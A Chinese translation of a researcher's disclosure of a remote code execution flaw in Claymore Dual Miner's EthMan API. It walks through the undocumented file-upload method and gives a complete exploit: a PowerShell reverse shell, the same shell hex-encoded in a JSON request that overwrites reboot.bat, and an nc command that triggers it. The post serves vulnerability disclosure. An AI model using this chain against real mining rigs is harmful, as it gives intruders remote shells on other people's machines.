> 原文链接: https://www.anquanke.com//post/id/145517 


# Claymore Dual Miner远程命令执行漏洞


                                阅读量   
                                **107622**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://reversebrain.github.io/
                                <br>原文地址：[https://reversebrain.github.io/2018/02/01/Claymore-Dual-Miner-Remote-Code-Execution/](https://reversebrain.github.io/2018/02/01/Claymore-Dual-Miner-Remote-Code-Execution/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01219f5adb5ad22915.jpg)](https://p3.ssl.qhimg.com/t01219f5adb5ad22915.jpg)



## 前言

大家好，今天我将向您展示如何在由nanopool开发的流行Claymore Dual Miner上找到远程执行代码漏洞。<br>
您可以从<br>[https://github.com/nanopool/Claymore-Dual-Miner](https://github.com/nanopool/Claymore-Dual-Miner)<br>
从GitHub下载源码

在继续阅读之前，我想澄清一下，我已经通过电子邮件向nanopool发送了相关信息，却没有收到任何类型的响应，所以我决定公开披露了此漏洞以获得CVE编号。让我们开始吧！



## 过程分析

从版本7.3开始，开发人员引入了名为EthMan的远程管理工具，该工具允许在配置阶段控制矿工远程将JSON API字符串发送到特定端口集。这就是矿工们如何开采以太坊的方式：

```
EthDcrMiner64.exe -epool eth-eu.dwarfpool.com:8008 -ewal 0x83718eb67761Cf59E116B92A8F5B6CFE28A186E2 -epsw x -esm 0 -asm 0 -mode 1 -mport 5555
```

我不介绍每个参数，我们重点观察 -mport，这是我发现的最为有趣的漏洞之一：<br>
它会打开端口5555，等待来自远程管理器工具的传入连接。大概如下图<br>[![](https://p3.ssl.qhimg.com/t015db0e7f5e8814739.png)](https://p3.ssl.qhimg.com/t015db0e7f5e8814739.png)<br>
在将本地运行的矿工添加到列表中后，使用127.0.0.1作为IP，5555作为端口，我可以读取它的统计数据，例如Mh/s，GPU温度等等。另外，我查看了上下文，并立即注意到”Execute reboot .bat”函数，因此我开始阅读附带该工具的API文档：

```
EthMan uses raw TCP/IP connections (not HTTP) for remote management and statistics. Optionally, "psw" field is added to requests is the password for remote management is set for miner.
```

我深入了一下，收集了一些有用的JSON字符串：

```
REQUEST:

`{`"id":0,"jsonrpc":"2.0","method":"miner_restart"`}`

RESPONSE:
none.

COMMENTS:
Restarts miner.


REQUEST:
`{`"id":0,"jsonrpc":"2.0","method":"miner_reboot"`}`

RESPONSE:
none.

COMMENTS:
Calls "reboot.bat" for Windows, or "reboot.bash" (or "reboot.sh") for Linux.
```

有了这两个JSON字符串，我可以重新启动我的矿工或执行一个reboot.bat文件，该文件包含在矿工的同一个目录中。<br>
另一个有趣的远程管理器功能是”Edit config.txt”，它允许上传一个新的config.txt文件，但没有关于允许上传配置文件的API的文档，所以我打开了我的Wireshark，并开始捕获数据包。最后我发现了读取和发送配置文件的API：

```
`{`"id":0,"jsonrpc":"2.0","method":"miner_getfile","params":["config.txt"]`}`

`{`"id":0,"jsonrpc":"2.0","method":"miner_file","params":["config.txt","HEX_ENCODED_STRING"]`}`
```

基本上第一次请求一个文件，都将收到一个以十六进制编码的内容的响应，第二次上传一个新文件，它们都允许读取和写入矿工文件夹内的文件。我决定检查是否可以上传并覆盖reboot.bat文件，因此我在PowerShell中准备了反向shell：

```
powershell.exe -Command "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%`{`0`}`;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`{`;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()`}`;$client.Close()"
```



## payload构造

然后我以十六进制将其编码，并伪造JSON API字符串：

```
`{`"id":0,"jsonrpc":"2.0","method":"miner_file","params":["reboot.bat", "706f7765727368656c6c2e657865202d436f6d6d616e64202224636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e536f636b6574732e544350436c69656e7428273132372e302e302e31272c31323334293b2473747265616d203d2024636c69656e742e47657453747265616d28293b5b627974655b5d5d246279746573203d20302e2e36353533357c257b307d3b7768696c6528282469203d202473747265616d2e52656164282462797465732c20302c202462797465732e4c656e6774682929202d6e652030297b3b2464617461203d20284e65772d4f626a656374202d547970654e616d652053797374656d2e546578742e4153434949456e636f64696e67292e476574537472696e67282462797465732c302c202469293b2473656e646261636b203d202869657820246461746120323e2631207c204f75742d537472696e6720293b2473656e646261636b3220203d202473656e646261636b202b202750532027202b2028707764292e50617468202b20273e20273b2473656e6462797465203d20285b746578742e656e636f64696e675d3a3a4153434949292e4765744279746573282473656e646261636b32293b2473747265616d2e5772697465282473656e64627974652c302c2473656e64627974652e4c656e677468293b2473747265616d2e466c75736828297d3b24636c69656e742e436c6f7365282922"]`}`
```

然后我开始在端口1234上本地监听，并发送了重新启动API字符串：

```
echo -e '`{`"id":0,"jsonrpc":"2.0","method":"miner_reboot"`}`n' | nc 127.0.0.1 5555 &amp;&amp; echo
```

惊喜！<br>[![](https://p0.ssl.qhimg.com/t01225ded967b5128b0.png)](https://p0.ssl.qhimg.com/t01225ded967b5128b0.png)
